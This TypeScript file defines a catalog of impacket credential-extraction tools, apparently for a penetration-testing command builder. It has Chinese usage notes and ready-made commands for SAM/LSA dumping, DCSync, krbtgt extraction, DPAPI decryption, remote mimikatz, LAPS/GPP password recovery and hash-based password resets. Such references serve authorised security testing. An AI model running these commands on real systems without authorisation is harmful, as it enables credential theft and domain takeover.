// 参数定义来源为本机 impacket v0.13.1 --help 与官方 examples。
// 覆盖: secretsdump / regsecrets / dpapi / dpapidump / samedit / mimikatz / GetLAPSPassword / Get-GPPPassword / changepasswd
import type { Tool } from '../../../types';
import { buildImpacketAuth, buildImpacketDomainAuth, v } from '../../../lib/auth';

export const impacketCredsTools: Tool[] = [
  {
    id: 'impacket-regsecrets',
    name: 'impacket-regsecrets',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/regsecrets.py',
    description: '纯注册表远程秘密导出：不经 DRSUAPI/服务，直接远程读取 SAM/SECURITY hive 解出本地哈希、LSA secrets 与缓存凭据 (v0.13 新增)',
    commands: [
      {
        id: 'regsecrets-dump',
        title: '远程注册表秘密全量导出',
        description: '默认同时导出 SAM 哈希、MSCache 缓存凭据与 LSA secrets，不在目标执行任何 agent',
        build: (p) => `impacket-regsecrets ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>，需目标本地管理员权限
关键参数:
  -nosam / -nocache / -nolsa  分别跳过 SAM / MSCache / LSA secrets 导出
  -outputfile FILE  输出文件基名 (自动附加 .sam/.secrets/.cached 后缀)
  -history          同时导出密码历史与 LSA secrets 旧值
  -system SYSTEM / -bootkey BOOTKEY  提供本地 SYSTEM hive 或 bootkey 辅助解密
  -throttle SEC     各操作之间的节流秒数 (降低对目标的压力)
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k / -keytab <file>
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时指定目标 IP
说明: 与 secretsdump 的 SAM/LSA 部分类似，但完全通过远程注册表读取，
不创建服务、不走 DRSUAPI，对非 DC 成员机更轻量`,
        example: `impacket-regsecrets corp.local/administrator:Passw0rd@192.168.1.10 -outputfile regdump`,
      },
      {
        id: 'regsecrets-sam-only',
        title: '只导出 SAM 本地哈希',
        description: '-nocache -nolsa 跳过缓存凭据与 LSA secrets，快速拿本地管理员哈希',
        build: (p) => `impacket-regsecrets ${buildImpacketAuth(p, { targetIp: true })} -nocache -nolsa`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
关键参数:
  -nocache  不导出 MSCache 缓存凭据
  -nolsa    不导出 LSA secrets
组合后只导出 SAM 本地账户哈希，速度最快、读取的注册表路径最少
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip / -target-ip`,
        example: `impacket-regsecrets corp.local/administrator:Passw0rd@192.168.1.10 -nocache -nolsa`,
      },
    ],
  },
  {
    id: 'impacket-dpapidump',
    name: 'impacket-dpapidump',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/dpapidump.py',
    description: '远程提取 SYSTEM 上下文的 DPAPI 凭据与 SCCM 客户端秘密 (自动完成 LSA secrets 读取与解密) (v0.13 新增)',
    commands: [
      {
        id: 'dpapidump-all',
        title: '提取 SYSTEM DPAPI 凭据 + SCCM 秘密',
        description: '默认同时提取 SYSTEM 用户 DPAPI 凭据与 SCCM 客户端凭据 (SCCM 环境常直接拿到域账户)',
        build: (p) => `impacket-dpapidump ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>，需目标本地管理员权限
关键参数:
  -creds     只提取 SYSTEM 用户的 DPAPI 凭据
  -sccm      只提取 SCCM 客户端凭据 (默认不指定时两者都提取)
  -userkey KEY  直接提供 SYSTEM 的 dpapi_userkey (如之前 secretsdump 导出过)，
                省略时工具会先执行一次 LSA secrets dump 自动获取
  -bootkey BOOTKEY  SYSTEM hive 的 bootkey
  -throttle SEC   各操作之间的节流秒数
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k / -keytab <file>
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时指定目标 IP
说明: SCCM 客户端常缓存高权限账户凭据 (NAA 账户/任务序列凭据)，
该工具一条命令完成提取+解密，省去手动跑 secretsdump + dpapi 多步操作`,
        example: `impacket-dpapidump corp.local/administrator:Passw0rd@192.168.1.20`,
      },
      {
        id: 'dpapidump-userkey',
        title: '复用已导出的 dpapi_userkey',
        description: '-userkey 直接提供 SYSTEM dpapi_userkey，跳过 LSA secrets dump，更快更安静',
        build: (p) => `impacket-dpapidump ${buildImpacketAuth(p, { targetIp: true })} -userkey ${v('', 'DPAPI_USERKEY')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
关键参数:
  -userkey KEY  SYSTEM 的 dpapi_userkey (0x... 十六进制)，
                通常来自之前 secretsdump/regsecrets 导出的 LSA secrets ($MACHINE.ACC / DPAPI_SYSTEM)
  -creds / -sccm  限定提取范围
说明: 已拿到 userkey 后重复打点同网段机器时，省去每次都 dump LSA 的步骤
认证参数: -hashes / -k -no-pass / -aesKey -k / -keytab
连接参数: -dc-ip / -target-ip`,
        example: `impacket-dpapidump corp.local/administrator:Passw0rd@192.168.1.20 -userkey 0x0123456789abcdef...`,
      },
    ],
  },
  {
    id: 'impacket-samedit',
    name: 'impacket-samedit',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/samedit.py',
    description: '离线就地修改 SAM hive 中本地用户的密码/哈希 (配合 ntdsutil/reg save 导出的 hive 使用) (v0.13 新增)',
    commands: [
      {
        id: 'samedit-password',
        title: '离线重置 SAM 中用户密码',
        description: '-password 设置新密码，-system 提供对应 SYSTEM hive 计算 bootkey 完成加密',
        build: (p) => `impacket-samedit -password ${v('', 'NEWPASSWORD')} -system ${v(p.fileName, 'SYSTEM')} ${v(p.username, 'USER')} ${v(p.remotePath, 'SAM')}`,
        usage: `位置参数:
  user     要替换密码的本地用户名
  sam      要编辑的 SAM hive 文件 (就地修改，建议先备份)
关键参数:
  -password PASS  要设置的新密码 (与 -hashes 二选一)
  -system SYSTEM  包含 bootkey 的 SYSTEM hive (密码加密必需；与 -bootkey 二选一)
  -bootkey BOOTKEY  直接提供 bootkey (十六进制)
说明: 纯离线工具。拿到主机的 SAM+SYSTEM hive (如 VSS/磁盘镜像) 后改写管理员密码，
再把 hive 写回或用于还原场景；修改是就地的，原始密码不可逆恢复`,
        example: `impacket-samedit -password 'N3wP@ss!' -system SYSTEM Administrator SAM`,
      },
      {
        id: 'samedit-hashes',
        title: '离线直接写入 NTLM 哈希',
        description: '-hashes 直接替换 NTLM 哈希 (LM 部分可选)，-bootkey 直接给 bootkey',
        build: (p) => `impacket-samedit -hashes :${v(p.ntHash, 'NTHASH')} -bootkey ${v('', 'BOOTKEY')} ${v(p.username, 'USER')} ${v(p.remotePath, 'SAM')}`,
        usage: `位置参数:
  user     要替换哈希的本地用户名
  sam      要编辑的 SAM hive 文件
关键参数:
  -hashes HASHES  直接替换 NTLM 哈希，格式 LMHASH:NTHASH (LM 可省略写 :NTHASH)
  -bootkey BOOTKEY  bootkey 十六进制 (可用 secretsdump 从 SYSTEM hive 解出)
说明: 写入已知哈希后可直接 Pass-the-Hash 登录，常用于篡改磁盘镜像/备份中的凭据`,
        example: `impacket-samedit -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -bootkey 0123456789abcdef... Administrator SAM`,
      },
    ],
  },
  {
    id: 'impacket-secretsdump',
    name: 'impacket-secretsdump',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/secretsdump.py',
    description: '远程或离线导出密码哈希与 Kerberos 密钥 (SAM/LSA/NTDS.dit)，默认走 DRSUAPI',
    commands: [
      {
        id: 'secretsdump-local-hives',
        title: '本地 SAM/SECURITY/SYSTEM hive 导出',
        description: '解析本地导出的注册表 hive，target 为关键字 LOCAL',
        build: () => `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`,
        usage: `本地离线解析注册表 hive (target 必须为关键字 LOCAL):
  -sam SAM          SAM hive 文件路径，导出本地用户 NTLM 哈希
  -system SYSTEM    SYSTEM hive 文件路径，用于计算 bootkey (必须为二进制 REGF 格式)
  -security SECURITY SECURITY hive 文件路径，导出 LSA secrets 与缓存凭据
  -bootkey BOOTKEY  可选，直接提供 bootkey 代替 SYSTEM hive
  -outputfile       输出文件基名，自动附加 .sam/.secrets/.cached 后缀
hive 可通过 reg save 导出: reg save HKLM\\SAM SAM / reg save HKLM\\SYSTEM SYSTEM`,
        example: `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`,
      },
      {
        id: 'secretsdump-remote',
        title: '远程 SAM/LSA 导出',
        description: '远程导出目标 SAM/LSA/缓存凭据；目标为 DC 时等价于 DCSync 全量导出',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `远程导出目标机器的全部机密 (默认 DRSUAPI + SAM/SECURITY 读取):
  target            [[domain/]username[:password]@]<targetName or address>
  -hashes LMHASH:NTHASH  Pass-the-Hash 认证
  -k -no-pass       Kerberos 认证 (使用 KRB5CCNAME 指向的 ccache)
  -aesKey <hex> -k  使用 AES key 进行 Kerberos 认证
  -dc-ip            指定域控 IP (省略时使用 target 中的域名部分)
  -target-ip        目标主机名无法解析时指定目标 IP
  -outputfile       输出文件基名
目标是域控时会导出全部域用户哈希 (即 DCSync)，需要复制权限 (如域管)`,
        example: `impacket-secretsdump corp.local/administrator:Passw0rd@192.168.1.10`,
      },
      {
        id: 'secretsdump-just-dc',
        title: 'DCSync 导出所有域用户哈希',
        description: '-just-dc 仅提取 NTDS.dit 数据 (NTLM 哈希和 Kerberos 密钥)',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })} -just-dc`,
        usage: `仅通过 DRSUAPI 复制 NTDS.dit 数据 (DCSync)，不读取 SAM/SECURITY:
  -just-dc          只提取 NTDS.dit 数据 (NTLM 哈希和 Kerberos 密钥)
  -skip-user        跳过指定用户，可逗号分隔多个用户或提供用户列表文件
  -history          同时导出密码历史
  -pwd-last-set     显示每个账户的 pwdLastSet 属性
  -user-status      显示账户是否被禁用
  -resumefile       断点续传文件 (仅 DRSUAPI)，大域环境必备
需要 "复制目录更改" 权限 (域管/企业管或具备 DCSync ACL 的账户)`,
        example: `impacket-secretsdump corp.local/administrator:Passw0rd@dc01.corp.local -just-dc`,
      },
      {
        id: 'secretsdump-just-dc-ntlm',
        title: 'DCSync 仅导出 NTLM 哈希',
        description: '-just-dc-ntlm 跳过 Kerberos 密钥，速度更快',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })} -just-dc-ntlm`,
        usage: `仅通过 DRSUAPI 导出 NTLM 哈希，不解析 Kerberos 密钥:
  -just-dc-ntlm     只提取 NTDS.dit 中的 NTLM 哈希 (隐含 -just-dc)
  -outputfile       输出文件基名，结果写入 <基名>.ntds
  -history          同时导出 NTLM 密码历史
  -resumefile       断点续传文件
  -dc-ip            指定域控 IP
比 -just-dc 快很多，适合只需要 NTLM 哈希做 Pass-the-Hash 的场景`,
        example: `impacket-secretsdump corp.local/administrator:Passw0rd@dc01.corp.local -just-dc-ntlm`,
      },
      {
        id: 'secretsdump-just-dc-user',
        title: 'DCSync 导出指定用户',
        description: '-just-dc-user 只接收用户名 (不带 domain/ 前缀)，隐含 -just-dc',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })} -just-dc-user ${v('', 'USERNAME')}`,
        usage: `仅导出指定域账户的 NTDS.dit 数据:
  -just-dc-user USERNAME  只提取该用户的数据 (隐含 -just-dc)
                          注意只写用户名，不要带 domain/ 前缀
  -ldapfilter FILTER      也可用 LDAP 过滤器批量筛选用户 (隐含 -just-dc)
  -history                同时导出该用户的密码历史
常用于精准获取 krbtgt (制作黄金票据) 或单个高价值账户的哈希/AES 密钥`,
        example: `impacket-secretsdump corp.local/administrator:Passw0rd@dc01.corp.local -just-dc-user krbtgt`,
      },
      {
        id: 'secretsdump-use-vss',
        title: 'VSS 卷影副本方式导出 NTDS',
        description: '-use-vss 使用 NTDSUTIL VSS 方法代替默认 DRSUAPI，可用 -exec-method 指定执行方式',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })} -use-vss`,
        usage: `在目标 DC 上创建卷影副本并拉回 NTDS.dit/SAM/SYSTEM 后本地解析:
  -use-vss          使用 NTDSUTIL VSS 方法代替默认 DRSUAPI
  -exec-method      VSS 模式下的远程执行方式: smbexec (默认) / wmiexec / mmcexec
  -skip-sam         不解析远程 SAM hive
  -skip-security    不解析远程 SECURITY hive
会在目标上执行命令并写入磁盘，需要目标本地管理员权限；
与 DRSUAPI 不同，不依赖目录复制权限`,
        example: `impacket-secretsdump corp.local/administrator:Passw0rd@dc01.corp.local -use-vss -exec-method wmiexec`,
      },
      {
        id: 'secretsdump-offline-ntds',
        title: '本地解析 NTDS.dit',
        description: '离线解析 ntdsutil/VSS 导出的 NTDS.dit 与 SYSTEM hive，-outputfile 为输出文件基名',
        build: () => `impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile ntds_dump LOCAL`,
        usage: `离线解析已拿到手的 NTDS.dit (target 必须为关键字 LOCAL):
  -ntds NTDS.DIT    NTDS.dit 文件路径
  -system SYSTEM    对应 DC 的 SYSTEM hive (解密 bootkey 必需)
  -outputfile       输出文件基名，自动生成 .ntds/.secrets 等文件
  -history          同时导出密码历史
  -user-status      显示账户是否被禁用
NTDS.dit 可用 ntdsutil "ac i ntds" "ifm" ... 或 VSS 从 DC 上导出`,
        example: `impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile ntds_dump LOCAL`,
      },
    ],
  },
  {
    id: 'impacket-dpapi',
    name: 'impacket-dpapi',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/dpapi.py',
    description: '离线/在线解密 DPAPI 体系机密 (backupkeys/masterkey/credential/vault 等子命令)',
    commands: [
      {
        id: 'dpapi-backupkeys',
        title: '导出域 DPAPI 备份密钥',
        description: 'backupkeys 子命令从 DC 导出域备份密钥，--export 保存为 .pvk 文件',
        build: (p) => `impacket-dpapi backupkeys -t ${buildImpacketAuth(p)} --export`,
        usage: `backupkeys 子命令: 从域控获取 DPAPI 域备份密钥 (需域管权限):
  -t, --target      [[domain/]username[:password]@]<targetName or address> (必填，指向 DC)
  --export          将备份密钥导出保存为 .pvk 文件
  -hashes LMHASH:NTHASH  Pass-the-Hash 认证
  -k -no-pass       Kerberos 认证
  -aesKey <hex> -k  使用 AES key 进行 Kerberos 认证
  -dc-ip            指定域控 IP
导出的 .pvk 可配合 masterkey 子命令离线解密任意域用户的 masterkey`,
        example: `impacket-dpapi backupkeys -t corp.local/administrator:Passw0rd@dc01.corp.local --export`,
      },
      {
        id: 'dpapi-masterkey-pvk',
        title: '用域备份私钥解密 masterkey',
        description: 'masterkey 子命令离线解密 masterkey 文件，也可用 -sid/-password 按用户上下文解密',
        build: (p) => `impacket-dpapi masterkey -file ${v(p.fileName, 'MASTERKEY_FILE')} -pvk ${v('', 'BACKUPKEY.pvk')}`,
        usage: `masterkey 子命令: 解密 DPAPI Master Key 文件:
  -file FILE        要解析的 Master Key 文件 (必填)
  -pvk PVK          域备份私钥文件 (backupkeys --export 导出的 .pvk)
  -sid SID          用户 SID (按用户上下文解密时必填)
  -password PASS    用户密码；指定了 -sid 而未给 -password 时会交互提示
  -key KEY          直接指定解密用的 key
  -system SYSTEM / -security SECURITY  用本地 hive 推导 DPAPI_SYSTEM key
  -t TARGET         在线方式: 提供 masterkey 所有者的凭据向 DC 请求解密
解密成功会输出形如 0x... 的 key，供 credential/vault/unprotect 子命令使用`,
        example: `impacket-dpapi masterkey -file 0a8b0a51-2c34-4a3f-9b0e-111111111111 -pvk key_backup.pvk`,
      },
      {
        id: 'dpapi-credential',
        title: '解密 Credential 文件',
        description: 'credential 子命令用已解出的 masterkey 解密 Credential 文件',
        build: () => `impacket-dpapi credential -file ${v('', 'CREDENTIAL_FILE')} -key ${v('', 'KEY')}`,
        usage: `credential 子命令: 解密 Windows Credential 文件:
  -file FILE        Credential 文件路径 (必填)，通常位于
                    %APPDATA%\\Microsoft\\Credentials\\ 下
  -key KEY          解密用 key，即 masterkey 子命令输出的 key
前置步骤: 先用 masterkey 子命令解出对应用户 masterkey 的 key`,
        example: `impacket-dpapi credential -file 8A163D3A2B1F... -key 0x6a2d3f...`,
      },
      {
        id: 'dpapi-vault',
        title: '解密 Vault 凭据',
        description: 'vault 子命令解密 Windows Vault (VCRD/VPOL) 凭据',
        build: () => `impacket-dpapi vault -vcrd ${v('', 'VAULT.vcrd')} -vpol ${v('', 'VAULT.vpol')} -key ${v('', 'KEY')}`,
        usage: `vault 子命令: 解密 Windows Vault 凭据:
  -vcrd VCRD        Vault Credential 文件 (.vcrd)
  -vpol VPOL        Vault Policy 文件 (.vpol)
  -key KEY          解密用 master key (masterkey 子命令输出的 key)
文件通常位于 %APPDATA%\\Microsoft\\Vault\\ 与 %LOCALAPPDATA%\\Microsoft\\Vault\\ 下`,
        example: `impacket-dpapi vault -vcrd 3D6A....vcrd -vpol 4BF5C....vpol -key 0x6a2d3f...`,
      },
    ],
  },
  {
    id: 'impacket-mimikatz',
    name: 'impacket-mimikatz',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/mimikatz.py',
    description: '通过 RPC 在远程目标上加载执行 mimikatz 的客户端',
    commands: [
      {
        id: 'mimikatz-interactive',
        title: '远程交互式 mimikatz',
        description: '在目标上远程加载 mimikatz 并进入 mini shell，逐条输入命令',
        build: (p) => `impacket-mimikatz ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `远程在目标机器上加载 mimikatz (需本地管理员权限):
  target            [[domain/]username[:password]@]<targetName or address>
  -hashes LMHASH:NTHASH  Pass-the-Hash 认证
  -k -no-pass       Kerberos 认证
  -aesKey <hex> -k  使用 AES key 进行 Kerberos 认证
  -dc-ip            指定域控 IP
  -target-ip        目标主机名无法解析时指定目标 IP
启动后进入 mimikatz mini shell，可输入 sekurlsa::logonpasswords 等命令`,
        example: `impacket-mimikatz corp.local/administrator:Passw0rd@192.168.1.20`,
      },
      {
        id: 'mimikatz-file',
        title: '从文件批量执行 mimikatz 命令',
        description: '-file 指定包含 mimikatz 命令的本地文件批量执行',
        build: (p) => `impacket-mimikatz ${buildImpacketAuth(p, { targetIp: true })} -file ${v(p.fileName, 'COMMANDS.TXT')}`,
        usage: `从本地文件读取 mimikatz 命令在目标上批量执行:
  -file FILE        包含 mimikatz 命令的本地文件 (每行一条)
  target            [[domain/]username[:password]@]<targetName or address>
  -hashes / -k / -aesKey  同交互式用法
  -dc-ip / -target-ip     同交互式用法
例如文件中写入 privilege::debug 与 sekurlsa::logonpasswords 两行`,
        example: `impacket-mimikatz corp.local/administrator:Passw0rd@192.168.1.20 -file mimi_cmds.txt`,
      },
    ],
  },
  {
    id: 'impacket-GetLAPSPassword',
    name: 'impacket-GetLAPSPassword',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetLAPSPassword.py',
    description: '通过 LDAP 提取域中计算机的 LAPS 本地管理员密码',
    commands: [
      {
        id: 'getlaps-all',
        title: '导出所有计算机的 LAPS 密码',
        description: '枚举 LDAP 中所有带 LAPS 属性的计算机账户',
        build: (p) => `impacket-GetLAPSPassword ${buildImpacketDomainAuth(p)}`,
        usage: `通过 LDAP 查询全部计算机的 LAPS 密码 (ms-Mcs-AdmPwd 属性):
  target            domain[/username[:password]] 域身份，不是主机
  -hashes LMHASH:NTHASH  Pass-the-Hash 认证
  -k -no-pass       Kerberos 认证
  -aesKey <hex> -k  使用 AES key 进行 Kerberos 认证
  -dc-ip            指定域控 IP (省略时使用 target 中的域名部分)
  -outputfile, -o   结果输出到文件
需要对该属性有读取权限的账户 (默认域管及被委派组)`,
        example: `impacket-GetLAPSPassword corp.local/jdoe:Passw0rd -dc-ip 192.168.1.10`,
      },
      {
        id: 'getlaps-computer',
        title: '查询指定计算机的 LAPS 密码',
        description: '-computer 只查询单台计算机',
        build: (p) => `impacket-GetLAPSPassword ${buildImpacketDomainAuth(p)} -computer ${v(p.targetHost, 'COMPUTERNAME')}`,
        usage: `仅查询单台计算机的 LAPS 密码:
  -computer NAME    目标计算机名
  target            domain[/username[:password]] 域身份
  -dc-ip            指定域控 IP
  -dc-host          指定域控主机名 (省略时使用 target 中的域名部分)
  -ldaps            使用 LDAPS (LDAP over SSL)，Server 2025 强制 LDAPS 时必需`,
        example: `impacket-GetLAPSPassword corp.local/jdoe:Passw0rd -dc-ip 192.168.1.10 -computer WS01`,
      },
    ],
  },
  {
    id: 'impacket-Get-GPPPassword',
    name: 'impacket-Get-GPPPassword',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/Get-GPPPassword.py',
    description: '查找并解密组策略首选项 (GPP) XML 中存储的 cpassword 密码',
    commands: [
      {
        id: 'gpp-remote-sysvol',
        title: '远程搜索 SYSVOL 中的 GPP 密码',
        description: '通过 SMB 递归搜索共享目录下的 GPP XML 并解密 cpassword',
        build: (p) => `impacket-Get-GPPPassword ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `远程通过 SMB 搜索 GPP XML 文件并解密其中的 cpassword:
  target            [[domain/]username[:password]@]<targetName or address>
  -share SHARE      指定要搜索的 SMB 共享 (默认自动枚举)
  -base-dir DIR     共享内的起始搜索目录 (默认 /)
  -port PORT        SMB 目标端口
  -hashes LMHASH:NTHASH  Pass-the-Hash 认证
  -k -no-pass       Kerberos 认证
  -dc-ip / -target-ip  指定域控 IP / 目标 IP
通常指向 DC 的 SYSVOL 共享；Groups.xml/ScheduledTasks.xml 等常含密码`,
        example: `impacket-Get-GPPPassword corp.local/jdoe:Passw0rd@dc01.corp.local -share SYSVOL`,
      },
      {
        id: 'gpp-local-xml',
        title: '本地解析 GPP XML 文件',
        description: '-xmlfile 直接解析本地 XML 文件，target 为关键字 LOCAL',
        build: () => `impacket-Get-GPPPassword -xmlfile ${v('', 'Groups.xml')} LOCAL`,
        usage: `本地离线解析已下载的 GPP XML 文件 (target 必须为关键字 LOCAL):
  -xmlfile XMLFILE  要解析的 GPP XML 文件 (Groups.xml / Services.xml /
                    ScheduledTasks.xml / DataSources.xml / Printers.xml 等)
自动识别并解密其中的 cpassword 属性 (AES 密钥已公开)`,
        example: `impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL`,
      },
    ],
  },
  {
    id: 'impacket-changepasswd',
    name: 'impacket-changepasswd',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/changepasswd.py',
    description: '通过多种协议 (smb-samr/rpc-samr/kpasswd/ldap) 修改或重置域/本地账户密码',
    commands: [
      {
        id: 'changepasswd-change',
        title: '修改自己的密码 (需知道旧密码)',
        description: '以目标账户自身凭据修改密码，默认协议 smb-samr',
        build: (p) => `impacket-changepasswd ${buildImpacketAuth(p)} -newpass ${v('', 'NEWPASSWORD')}`,
        usage: `修改 target 账户的密码 (认证身份即被改密账户，需知道当前密码):
  target            [[domain/]username[:password]@]<hostname or address>
  -newpass NEWPASS  新密码 (与 -newhashes 二选一)
  -newhashes LMHASH:NTHASH  直接设置新的 NTLM 哈希 (可只给 NTHASH)
  -protocol, -p     协议: smb-samr (默认) / rpc-samr / kpasswd / ldap
  -hashes LMHASH:NTHASH   用哈希认证被改密账户
  -k / -aesKey      Kerberos 认证 (作用于 -altuser 或 target 账户)
  -dc-ip            域控 IP (供 Kerberos 使用)
修改需符合密码策略；kpasswd 走 Kerberos 464 端口，ldap 需 LDAPS/SASL`,
        example: `impacket-changepasswd -newpass NewP@ss123 -p rpc-samr corp.local/jdoe:OldP@ss@dc01.corp.local`,
      },
      {
        id: 'changepasswd-reset',
        title: '特权账户重置他人密码',
        description: '-reset 配合 -altuser/-altpass 用特权账户重置目标账户密码，可绕过部分密码策略',
        build: (p) => `impacket-changepasswd ${buildImpacketAuth(p)} -reset -altuser ${v('', 'ADMIN_USER')} -altpass ${v('', 'ADMIN_PASS')} -newpass ${v('', 'NEWPASSWORD')}`,
        usage: `用特权账户 (-altuser) 重置 target 账户的密码，无需知道旧密码:
  -reset, -admin    重置模式 (可绕过部分密码策略，如最短使用期限)
  -altuser ALTUSER  执行重置操作的特权用户名
  -altpass ALTPASS  特权用户密码 (与 -althash 二选一)
  -althash ALTHASH  特权用户 NT 哈希 (可只给 NTHASH)
  -newpass NEWPASS  目标账户的新密码
  -protocol, -p     smb-samr (默认) / rpc-samr / kpasswd / ldap
需要对该账户有 Reset Password 权限 (域管、Account Operators 或 ACL 委派)`,
        example: `impacket-changepasswd -reset -altuser administrator -altpass 'AdminP@ss' -newpass 'N3wP@ss!' corp.local/svc-backup:whatever@dc01.corp.local`,
      },
      {
        id: 'changepasswd-newhashes-ldap',
        title: 'LDAP 协议设置新哈希',
        description: '-newhashes 直接将目标账户密码设置为指定 NTLM 哈希',
        build: (p) => `impacket-changepasswd ${buildImpacketAuth(p)} -newhashes :${v(p.ntHash, 'NTHASH')} -protocol ldap`,
        usage: `通过指定协议将账户密码直接设置为 NTLM 哈希:
  -newhashes LMHASH:NTHASH  新哈希 (可省略 LM 部分只写 :NTHASH)
  -protocol, -p ldap        使用 LDAP 协议 (unicodePwd，需 LDAPS 或 SASL 加密通道)
  也可选 smb-samr / rpc-samr / kpasswd
  target            被修改账户 [[domain/]username[:password]@]<hostname>
  -altuser/-altpass 特权账户认证 (重置他人哈希时)
设置哈希后可直接 Pass-the-Hash 登录该账户`,
        example: `impacket-changepasswd -newhashes :8846f7eaee8fb117ad06bdd830b7586c -p ldap corp.local/jdoe:Passw0rd@dc01.corp.local`,
      },
    ],
  },
];
